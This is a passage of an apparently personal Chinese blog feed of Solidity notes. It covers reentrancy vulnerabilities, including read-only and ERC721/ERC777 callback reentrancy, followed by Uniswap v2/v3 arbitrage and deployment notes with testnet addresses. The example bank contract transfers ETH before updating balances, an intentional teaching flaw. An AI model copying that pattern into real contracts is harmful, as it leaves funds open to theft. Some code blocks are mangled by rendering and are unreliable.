0, &quot;ReentrancyGuard: reentrant call&quot;);<br>      // 在此之后对 nonReentrant 的任何调用都将失败<br>      _status = 1;<br>      _;<br>      // 调用结束，将 _status 恢复为0<br>      _status = 0;<br>  &#125;<br><br>  function deposit() external payable &#123;<br>    require(msg.value &gt; 0, &quot;Deposit amount must ba greater than 0&quot;);<br>    balances[msg.sender] += msg.value;<br>  &#125;<br><br>  function withdraw(uint256 _amount) external nonReentrant &#123;<br>    require(_amount &gt; 0, &quot;Withdrawal amount must be greater than 0&quot;);<br>    require(isAllowedToWithdraw(msg.sender, _amount), &quot;Insufficient balance&quot;);<br><br>    (bool success, ) = msg.sender.call&#123;value: _amount&#125;(&quot;&quot;);<br>    require(success, &quot;Withdraw failed&quot;);<br><br>    balances[msg.sender] -= _amount;<br>  &#125;<br><br>  function isAllowedToWithdraw(address _user, uint256 _amount) public view returns(bool) &#123;<br>    return balances[_user] &gt;= _amount;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如代码所示，在这个合约中，已经没有攻击者发挥重入的空间了。然而，这里没有，不代表别处没有。。。 我们可以看到合约里有一个公开的只读函数<code>isAllowedToWithdraw</code>，这类函数就是用来以提供信息为目的的。很多项目的合约里都或多或少有一些这类函数，而这类函数又常被其他项目的合约来调用获取信息，最终完成Defi世界里的一个乐高积木。可以看到这个重要的<code>withdraw</code>函数已经被上了锁，不可以重入攻击，但是在他的执行过程中的<code>ETH</code>转账那一步，<code>ETH</code>刚刚转出，假设攻击者想要此刻调用<code>isAllowedToWithdraw</code>函数，可以预见即便是<code>_amount</code>数值很大，攻击者的存款实际已被掏空，但返回值仍然是<code>true</code>因为账本在此刻还没有更新。那么，攻击者就可以在他的恶意合约里的<code>fallback</code>函数中设置外部函数调用,去攻击他已知的其他项目的依据<code>isAllowedToWithdraw</code>函数返回结果来制定操作的那些合约。</p><p>上面这个合约本身不遭攻击，而合作伙伴的合约遭到攻击。。。典型的：</p><p><em>“我不杀伯仁，伯仁却因我而死…” – 戴锁婆婆</em></p><p>针对<code>Read-Only Reentrancy</code>, <a href="https://github.com/euler-xyz/euler-contracts/commit/91adeee39daf8ece00584b6f7ec3e60a1d226bc9#diff-05f47d885ccf959493d5c53203672966544d73232f5410184d5484a7aedf0c5eR260">Euler Finance</a>采用<code>read-only reentrancy guard</code>，仅当未加锁时才能进行读取。同时，锁的可见性可以设置为<code>public</code>以供其他项目使用</p><blockquote><p>这就是典型的依赖缺陷，比如说有一个项目，它依赖的就是VulnerableBank的isAllowedToWithdraw函数攻击者可以对合约发起攻击，但被攻击合约还没有来得及调用依赖的isAllowedToWithdraw函数的返回内容时就被掏空了，这里很抽象很绕啊</p></blockquote><h2 id="4-ERC721-ERC777-Reentrancy"><a href="#4-ERC721-ERC777-Reentrancy" class="headerlink" title="4. ERC721 &amp; ERC777 Reentrancy"></a>4. ERC721 &amp; ERC777 Reentrancy</h2><p>这两种代币标准都各自规定了一个回调函数：</p><p>ERC721: <code>function onERC721Received(address _operator, address _from, uint256 _tokenId, bytes memory _data) public returns(bytes4);</code></p><p>ERC777: <code>function tokensReceived(address _operator, address _from, address _to, uint256 _amount, bytes calldata _userData, bytes calldata _operatorData) external;</code></p><p>有回调函数的存在就有接手代码执行权的机会，同时也会营造出重入攻击的可能性。对这一情况就不展示代码示例了，因为结合上述几个案例，这一条现在应该很容易理解了。并且，实在是能够玩出无穷花样。</p><blockquote><p>只要有回调函数，就有重入的可能性</p></blockquote><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>至此，我们审阅了几个实际发生的，各种花样的重入攻击的逻辑本体和它们的简易代码，相信各位同学应该不难看出，这些合约被攻击，是由于它们都共有一个缺陷。那就是这些合约的设计对于重入攻击的防范，都太过于依赖一个直截了当的工具（重入锁）的保护，而没有贯彻另一条良好的设计习惯 <em>检查-影响-交互模式</em> 。 简单的工具永远不会是完美防御，贯彻的方法论才是你永远的后盾 <em>（报告首长，本节代码课的思政任务已传达，请验收）</em></p><p>所以，对于使用小工具，还是使用方法论的取舍，我们作为solidity devs，答案我想应该是：既要…又要…！从跨函数的攻击，再到跨合约，跨项目的攻击，若是要求devs和auditors记住这越来越庞大的乐高之间的千丝万缕的联系，实在是有些强人所难。于是，在构造过程中的每一步，都标准地布置多道不同防御机制，便能省心地获得更好的结果。</p><h1 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h1>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-9Solidity笔记之九闪电贷套利</title>
    <link href="/2025/08/14/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B9%9D/"/>
    <url>/2025/08/14/08-9Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E4%B9%9D/</url>
    
    <content type="html"><![CDATA[<p>uniswap v2 &lt;&#x3D;&#x3D;&#x3D;&gt;v3 两个池子之间套利</p><p>思路是由v2发起，由v3出来，</p><p>v2的时候是直接调用池子进行闪电贷</p><p>v3的时候是调用路由合约进行swap</p><p>第一步：在v2池子添加流动性</p><p>池子里的代币是DAI和ETH</p><p>池子里 1 ETH &#x3D; 2000DAI</p><p>所以添加代币应该添加 0.1 ETH &lt;&#x3D;&#x3D;&gt; 200DAI</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">t.Run(<span class="hljs-string">&quot;test myConfig AddLiquidity &quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>caller := createManager(myConfig)<br>tokenA := DAI<br>tokenB := WETH<br>tokenAAmount := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">200</span>), big.NewInt(<span class="hljs-number">1e18</span>))<br>tokenBAmount := <span class="hljs-built_in">new</span>(big.Int).Mul(big.NewInt(<span class="hljs-number">200</span>), big.NewInt(<span class="hljs-number">1e18</span>))<br>caller.AddLiquidity(tokenA, tokenB, tokenAAmount, tokenBAmount)<br><br>&#125;)<br></code></pre></td></tr></table></figure><p>现在两个池子的价格是这样的，</p><p>v2的池子价格</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-number">1</span> Token1 = <span class="hljs-number">0.000500</span> Token0<br><span class="hljs-number">1</span> Token0 = <span class="hljs-number">2000.000000</span> Token1<br></code></pre></td></tr></table></figure><p>v3的池子的价格是</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">可读价格: <span class="hljs-number">1</span> Token1 = <span class="hljs-number">0.010081</span> Token0<br>反向价格: <span class="hljs-number">1</span> Token0 = <span class="hljs-number">99.197420</span> Token1<br></code></pre></td></tr></table></figure><h1 id="两个v2池子之间套"><a href="#两个v2池子之间套" class="headerlink" title="两个v2池子之间套"></a>两个v2池子之间套</h1><p>v2pool0 </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>08-8Solidity笔记之八uniswapv3</title>
    <link href="/2025/07/13/08-8Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AB/"/>
    <url>/2025/07/13/08-8Solidity%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%85%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="uniswap-v3-部署相关"><a href="#uniswap-v3-部署相关" class="headerlink" title="uniswap v3 部署相关"></a>uniswap v3 部署相关</h1><p>太棒了！既然你的 Hardhat 环境已经准备好，接下来部署 Uniswap V3 相关合约。Uniswap V3 是一个模块化系统，核心合约之间有依赖关系，部署顺序很重要。下面为你详细讲解<strong>部署顺序</strong>、<strong>每个合约作用</strong>及<strong>注意事项</strong>。</p><hr><h2 id="一、Uniswap-V3-合约结构与依赖关系"><a href="#一、Uniswap-V3-合约结构与依赖关系" class="headerlink" title="一、Uniswap V3 合约结构与依赖关系"></a>一、Uniswap V3 合约结构与依赖关系</h2><p>Uniswap V3 主要合约有：</p><ol><li><p><strong>UniswapV3Factory</strong>  </p><ul><li>作用：负责创建和管理所有的交易池（Pool）。</li><li>其它合约依赖：无。</li></ul></li><li><p><strong>UniswapV3Pool</strong>  </p><ul><li>作用：每个交易对的核心池合约，包含流动性、交换、价格等逻辑。</li><li>其它合约依赖：由 Factory 创建，不需要单独部署。</li></ul></li><li><p><strong>SwapRouter</strong>  </p><ul><li>作用：为用户提供便捷的路由和交易功能。</li><li>其它合约依赖：需要 Factory 地址和 WETH 地址。</li></ul></li><li><p><strong>NonfungiblePositionManager</strong>  </p><ul><li>作用：流动性 NFT 的管理器，负责铸造&#x2F;管理 LP NFT。</li><li>其它合约依赖：需要 Factory、WETH、NFTDescriptor 地址等。</li></ul></li><li><p><strong>NFTDescriptor &#x2F; NonfungibleTokenPositionDescriptor</strong>  </p><ul><li>作用：生成 LP NFT 的元数据和图像。</li><li>其它合约依赖：无，但要提供给 PositionManager 用。</li></ul></li><li><p><strong>WETH9</strong>  </p><ul><li>作用：包装 ETH 为 WETH，Uniswap V3 需要用 WETH 作为 ETH 代表。</li><li>其它合约依赖：SwapRouter 和 PositionManager 需要。</li></ul></li></ol><hr><h2 id="二、推荐部署顺序"><a href="#二、推荐部署顺序" class="headerlink" title="二、推荐部署顺序"></a>二、推荐部署顺序</h2><h3 id="1-部署-WETH9（如果你没有现成的-WETH-地址）"><a href="#1-部署-WETH9（如果你没有现成的-WETH-地址）" class="headerlink" title="1. 部署 WETH9（如果你没有现成的 WETH 地址）"></a>1. 部署 WETH9（如果你没有现成的 WETH 地址）</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 部署 WETH9</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">WETH9</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&quot;WETH9&quot;</span>);<br><span class="hljs-keyword">const</span> weth = <span class="hljs-keyword">await</span> <span class="hljs-title class_">WETH9</span>.<span class="hljs-title function_">deploy</span>();<br><span class="hljs-keyword">await</span> weth.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;WETH9 deployed to:&quot;</span>, weth.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><h3 id="2-部署-UniswapV3Factory"><a href="#2-部署-UniswapV3Factory" class="headerlink" title="2. 部署 UniswapV3Factory"></a>2. 部署 UniswapV3Factory</h3><p>已部署</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">Factory</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&quot;UniswapV3Factory&quot;</span>);<br><span class="hljs-keyword">const</span> factory = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Factory</span>.<span class="hljs-title function_">deploy</span>();<br><span class="hljs-keyword">await</span> factory.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Factory deployed to:&quot;</span>, factory.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><h3 id="3-部署-NFTDescriptor-Library"><a href="#3-部署-NFTDescriptor-Library" class="headerlink" title="3. 部署 NFTDescriptor Library"></a>3. 部署 NFTDescriptor Library</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NFTDescriptor</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&quot;NFTDescriptor&quot;</span>);<br><span class="hljs-keyword">const</span> nftDescriptor = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NFTDescriptor</span>.<span class="hljs-title function_">deploy</span>();<br><span class="hljs-keyword">await</span> nftDescriptor.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;NFTDescriptor deployed to:&quot;</span>, nftDescriptor.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><h3 id="4-部署-NonfungibleTokenPositionDescriptor"><a href="#4-部署-NonfungibleTokenPositionDescriptor" class="headerlink" title="4. 部署 NonfungibleTokenPositionDescriptor"></a>4. 部署 NonfungibleTokenPositionDescriptor</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NonfungibleTokenPositionDescriptor</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<br>  <span class="hljs-string">&quot;NonfungibleTokenPositionDescriptor&quot;</span>,<br>  &#123;<br>    <span class="hljs-attr">libraries</span>: &#123;<br>      <span class="hljs-title class_">NFTDescriptor</span>: nftDescriptor.<span class="hljs-property">address</span>,<br>    &#125;,<br>  &#125;<br>);<br><span class="hljs-keyword">const</span> descriptor = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NonfungibleTokenPositionDescriptor</span>.<span class="hljs-title function_">deploy</span>(weth.<span class="hljs-property">address</span>);<br><span class="hljs-keyword">await</span> descriptor.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;NonfungibleTokenPositionDescriptor deployed to:&quot;</span>, descriptor.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><h3 id="5-部署-NonfungiblePositionManager"><a href="#5-部署-NonfungiblePositionManager" class="headerlink" title="5. 部署 NonfungiblePositionManager"></a>5. 部署 NonfungiblePositionManager</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">NonfungiblePositionManager</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<br>  <span class="hljs-string">&quot;NonfungiblePositionManager&quot;</span><br>);<br><span class="hljs-keyword">const</span> positionManager = <span class="hljs-keyword">await</span> <span class="hljs-title class_">NonfungiblePositionManager</span>.<span class="hljs-title function_">deploy</span>(<br>  factory.<span class="hljs-property">address</span>,<br>  weth.<span class="hljs-property">address</span>,<br>  descriptor.<span class="hljs-property">address</span><br>);<br><span class="hljs-keyword">await</span> positionManager.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;NonfungiblePositionManager deployed to:&quot;</span>, positionManager.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><h3 id="6-部署-SwapRouter"><a href="#6-部署-SwapRouter" class="headerlink" title="6. 部署 SwapRouter"></a>6. 部署 SwapRouter</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> <span class="hljs-title class_">SwapRouter</span> = <span class="hljs-keyword">await</span> ethers.<span class="hljs-title function_">getContractFactory</span>(<span class="hljs-string">&quot;SwapRouter&quot;</span>);<br><span class="hljs-keyword">const</span> router = <span class="hljs-keyword">await</span> <span class="hljs-title class_">SwapRouter</span>.<span class="hljs-title function_">deploy</span>(factory.<span class="hljs-property">address</span>, weth.<span class="hljs-property">address</span>);<br><span class="hljs-keyword">await</span> router.<span class="hljs-title function_">deployed</span>();<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;SwapRouter deployed to:&quot;</span>, router.<span class="hljs-property">address</span>);<br></code></pre></td></tr></table></figure><hr><h2 id="三、注意事项"><a href="#三、注意事项" class="headerlink" title="三、注意事项"></a>三、注意事项</h2><ul><li><strong>库合约（如 NFTDescriptor）部署后地址要绑定到用到它的合约里。</strong></li><li><strong>部署合约时参数顺序要严格按照官方要求。</strong></li><li>部署脚本建议一步步打印每个合约的地址，方便后续参数传递。</li><li>如果部署到主网或测试网，WETH 地址是固定的，无需重复部署。</li></ul><hr><h2 id="四、实际部署脚本示例"><a href="#四、实际部署脚本示例" class="headerlink" title="四、实际部署脚本示例"></a>四、实际部署脚本示例</h2><p>你可以将上述每一步写进 Hardhat 的部署脚本（如 <code>deploy.js</code>），或者用 Hardhat Ignition 按模块拆分部署。</p><hr><h2 id="五、参考资料"><a href="#五、参考资料" class="headerlink" title="五、参考资料"></a>五、参考资料</h2><ul><li><a href="https://docs.uniswap.org/contracts/v3/reference/deployments">Uniswap V3 官方部署文档</a></li><li><a href="https://github.com/Uniswap/v3-core">Uniswap V3 Github源码</a></li><li><a href="https://github.com/Uniswap/v3-periphery">Uniswap V3 periphery</a></li></ul><hr><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><h2 id="第一套uniswap-v3"><a href="#第一套uniswap-v3" class="headerlink" title="第一套uniswap v3"></a>第一套uniswap v3</h2><p><strong>最小可用顺序</strong>：  </p><ol><li><p>WETH9  【已部署】</p><ol><li>0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d</li></ol></li><li><p>UniswapV3Factory  【已部署】</p><ol><li><a href="https://sepolia.abscan.org//address/0x1AcDD42Dc4BE0e140274B5ec93ffe1e30f000d65#code">https://sepolia.abscan.org//address/0x1AcDD42Dc4BE0e140274B5ec93ffe1e30f000d65#code</a></li></ol></li><li><p>NFTDescriptor  这个和下面的NonfungibleTokenPositionDescriptor必须要同时部署的【已部署】</p><ol><li>NonfungibleTokenPositionDescriptorModule#NFTDescriptor - 0x90F315c4244e014699b5673B218E1DcC8A0fE841<br>NonfungibleTokenPositionDescriptorModule#NonfungibleTokenPositionDescriptor - 0xF188bE37e3c3934b147250De745A95377AEd87A8</li></ol></li><li><p>NonfungibleTokenPositionDescriptor  【已部署】</p><ol><li>和上面一起创建</li></ol></li><li><p>NonfungiblePositionManager  【已部署】</p><ol><li>0x0f3482B9eEAC898C668195500c176AAa8627FE99</li><li><a href="https://sepolia.abscan.org//address/0x0f3482B9eEAC898C668195500c176AAa8627FE99#code">https://sepolia.abscan.org//address/0x0f3482B9eEAC898C668195500c176AAa8627FE99#code</a></li></ol></li><li><p>SwapRouter  </p><ol><li>0x4541dd7207afa33ab6530bbb9129c525800d4f6e</li></ol></li><li><p>DAI代币0xad9791220D95c6068D3529fDd1eE649Bd938F131</p></li></ol><hr><h2 id="重新部署了一套uniswapv3"><a href="#重新部署了一套uniswapv3" class="headerlink" title="重新部署了一套uniswapv3"></a>重新部署了一套uniswapv3</h2><ol><li>WETH9  【已部署】<ol><li>0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d</li><li>自己部署一个weth9</li></ol></li><li>UniswapV3Factory  【已部署】<ol><li>0x6AE6C57EA1D0FBb384cF3B70f71fE96aa5783b3d</li></ol></li><li>NFTDescriptor  这个和下面的NonfungibleTokenPositionDescriptor必须要同时部署的【已部署】<ol><li>0x121F7fEC7024E76c70C385c86fae2b8B261298ED</li></ol></li><li>NonfungibleTokenPositionDescriptor  【已部署】<ol><li>和上面一起创建0xc05fF5483ff4bd1CF15A033B3D068935Ade661e3</li></ol></li><li>NonfungiblePositionManager  【已部署】<ol><li>0x13f25EB5734b5ea1ed63C808cA5Ad16a819509F6</li></ol></li><li>SwapRouter  <ol><li>0xfFbc6Ba540280651875Ee5e93802Ceb67835BF2B</li></ol></li></ol><p>如果你需要<strong>详细的 Hardhat 部署脚本模板</strong>，或者遇到具体报错，欢迎随时贴出来！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// This setup uses Hardhat Ignition to manage smart contract deployments.</span><br><span class="hljs-comment">// Learn more about it at https://hardhat.org/ignition</span><br><span class="hljs-keyword">const</span> &#123;buildModule&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;@nomicfoundation/hardhat-ignition/modules&quot;</span>);<br><span class="hljs-keyword">const</span> &#123;ethers&#125; = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;hardhat&quot;</span>);<br><span class="hljs-number">0x5FbDB2315678afecb367f032d93F642f64180aa3</span><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-title function_">buildModule</span>(<span class="hljs-string">&quot;NonfungibleTokenPositionDescriptorModule&quot;</span>, <span class="hljs-function">(<span class="hljs-params">m</span>) =&gt;</span> &#123;<br>    <span class="hljs-comment">// 1. 先部署 NFTDescriptor 库（假设还没部署）</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">NFTDescriptor</span> = m.<span class="hljs-title function_">contract</span>(<span class="hljs-string">&quot;NFTDescriptor&quot;</span>);<br><br>    <span class="hljs-comment">// 2. 获取 WETH 地址（假设你已经有了 WETH9 地址）</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">WETH9Address</span> = <span class="hljs-string">&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;</span>; <span class="hljs-comment">// 你本地部署的 WETH9 地址</span><br><br>    <span class="hljs-comment">// 3. 转换 nativeCurrencyLabelBytes，Ignition 里可以用 ethers 来转换</span><br>    <span class="hljs-keyword">const</span> nativeCurrencyLabelBytes = ethers.<span class="hljs-property">utils</span>.<span class="hljs-title function_">formatBytes32String</span>(<span class="hljs-string">&quot;ETH&quot;</span>);<br><br>    <span class="hljs-comment">// 4. 部署 NonfungibleTokenPositionDescriptor，链接库并传构造参数</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-title class_">NonfungibleTokenPositionDescriptor</span> = m.<span class="hljs-title function_">contract</span>(<br>        <span class="hljs-string">&quot;NonfungibleTokenPositionDescriptor&quot;</span>,<br>        &#123;<br>            <span class="hljs-attr">libraries</span>: &#123;<br>                <span class="hljs-title class_">NFTDescriptor</span>: <span class="hljs-title class_">NFTDescriptor</span>,<br>            &#125;,<br>            <span class="hljs-attr">args</span>: [<span class="hljs-title class_">WETH9Address</span>, nativeCurrencyLabelBytes],<br>        &#125;<br>    );<br><br>    <span class="hljs-comment">// 5. 返回合约实例</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-title class_">NFTDescriptor</span>, <span class="hljs-title class_">NonfungibleTokenPositionDescriptor</span>&#125;;<br>&#125;);<br><span class="hljs-comment">//如果部署时需要转账</span><br><span class="hljs-comment">// const add = m.contract(&quot;Add&quot;, &#123; value: m.eth(1) &#125;);</span><br><span class="hljs-comment">// npx hardhat clean</span><br><span class="hljs-comment">// 部署到本地节点测试</span><br><span class="hljs-comment">// npx hardhat node</span><br><span class="hljs-comment">// npx hardhat run scripts/generateCalldata.js --network sepolia</span><br><span class="hljs-comment">// 本地部署合约命令</span><br><span class="hljs-comment">//  npx hardhat ignition deploy ./ignition/modules/NFTDescriptor.js --network localhost</span><br><span class="hljs-comment">//  npx hardhat ignition deploy ./ignition/modules/NFTDescriptor.js --network localhost</span><br><span class="hljs-comment">// Sepolia 部署合约命令</span><br><span class="hljs-comment">//  npx hardhat ignition deploy ./ignition/modules/NFTDescriptor.js --network abstract_test</span><br><span class="hljs-comment">//  npx hardhat ignition deploy ./ignition/modules/NFTDescriptor.js --network sepolia</span><br><span class="hljs-comment">// 带验证的部署合约命令</span><br><span class="hljs-comment">//  npx hardhat ignition deploy ./ignition/modules/NFTDescriptor.js --network abstract_test --verify</span><br><br><span class="hljs-comment">// 3. 使用 Hardhat 命令验证合约，注意可能会没有网络，复制终端代理命令</span><br><span class="hljs-comment">// npx hardhat verify --network rinkeby DEPLOYED_CONTRACT_ADDRESS &quot;constructor_arg1&quot; &quot;constructor_arg2&quot;</span><br><span class="hljs-comment">// npx hardhat verify --network sepolia 0x2eA286a6a484d9DB9749D55004018A2eE7C30E05</span><br><span class="hljs-comment">// return &#123; add &#125;;// 返回合约</span><br></code></pre></td></tr></table></figure><h3 id="测试swap"><a href="#测试swap" class="headerlink" title="测试swap"></a>测试swap</h3><p>创建一个BAI代币0xad9791220D95c6068D3529fDd1eE649Bd938F131</p><p>新代币0x43adb6c61b63bd44b91140d669f6156a619769f1</p><p>添加池子</p><p>怎么调用这个合约，怎么做一笔Swap都不会</p><p>大概是干嘛的，有哪些方法</p><p><a href="https://bscscan.com/token/0xc32cc70741c3a8433dcbcb5ade071c299b55ffc8">https://bscscan.com/token/0xc32cc70741c3a8433dcbcb5ade071c299b55ffc8</a></p><h3 id="添加池子，"><a href="#添加池子，" class="headerlink" title="添加池子，"></a>添加池子，</h3><ul><li><p>官方池子:0xaf7a9d74978975b4c85b62b6a54ef951a4f2efd3 费率为0.3%</p><ul><li><pre><code class="go">    factoryAddr := &quot;0x2E17FF9b877661bDFEF8879a4B31665157a960F0&quot;    client := ethereumcli.GetAbstract()    f := NewFactoryV3(factoryAddr, client)    weth9 := &quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;    dai := &quot;0x43adb6c61b63bd44b91140d669f6156a619769f1&quot;    //WETH9 := common.HexToAddress(&quot;&quot;)    //DAI := common.HexToAddress(&quot;0xad9791220D95c6068D3529fDd1eE649Bd938F131&quot;)    f.CreatePool(weth9, dai)<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs css"><br>- 官方池子:xx 费率为<span class="hljs-number">1%</span> <span class="hljs-number">0</span>xb0e690a1F158E94A704aba2E920C6C431B01758e<br><br>- <br><br>- 我的池子:<span class="hljs-number">0</span>xc0eca0dd080526bfd3db77b70b45f7b3a1e5f262<br><br>  - ```go<br>    func <span class="hljs-built_in">TestFactoryV3_CreatePool</span>(t *testing.T) &#123;<br>    //factoryAddr := <span class="hljs-string">&quot;0x2E17FF9b877661bDFEF8879a4B31665157a960F0&quot;</span> // 官方工厂<br>    factoryAddr := <span class="hljs-string">&quot;0x1AcDD42Dc4BE0e140274B5ec93ffe1e30f000d65&quot;</span> // 我的工厂<br>    client := ethereumcli.<span class="hljs-built_in">GetAbstract</span>()<br>    f := <span class="hljs-built_in">NewFactoryV3</span>(factoryAddr, client)<br>    weth9 := <span class="hljs-string">&quot;0x9EDCde0257F2386Ce177C3a7FCdd97787F0D841d&quot;</span><br>    dai := <span class="hljs-string">&quot;0x43adb6c61b63bd44b91140d669f6156a619769f1&quot;</span><br>    //WETH9 := common.<span class="hljs-built_in">HexToAddress</span>(<span class="hljs-string">&quot;&quot;</span>)<br>    //DAI := common.<span class="hljs-built_in">HexToAddress</span>(<span class="hljs-string">&quot;0xad9791220D95c6068D3529fDd1eE649Bd938F131&quot;</span>)<br>    f.<span class="hljs-built_in">CreatePool</span>(weth9, dai)<br></code></pre></td></tr></table></figure></code></pre></li></ul></li><li><p>uniswapOfficial 池子：0xa1Fb559f737A090646b5398C69b91769Da512d71</p></li></ul><h3 id="给-NonfungiblePositionManager-合约授权（Approve）"><a href="#给-NonfungiblePositionManager-合约授权（Approve）" class="headerlink" title="给 NonfungiblePositionManager 合约授权（Approve）"></a>给 NonfungiblePositionManager 合约授权（Approve）</h3><p>你需要先给 NonfungiblePositionManager 合约授权，允许它转移你准备提供的两种代币（token0 和 token1）。</p><ul><li><p>调用两次代币合约的 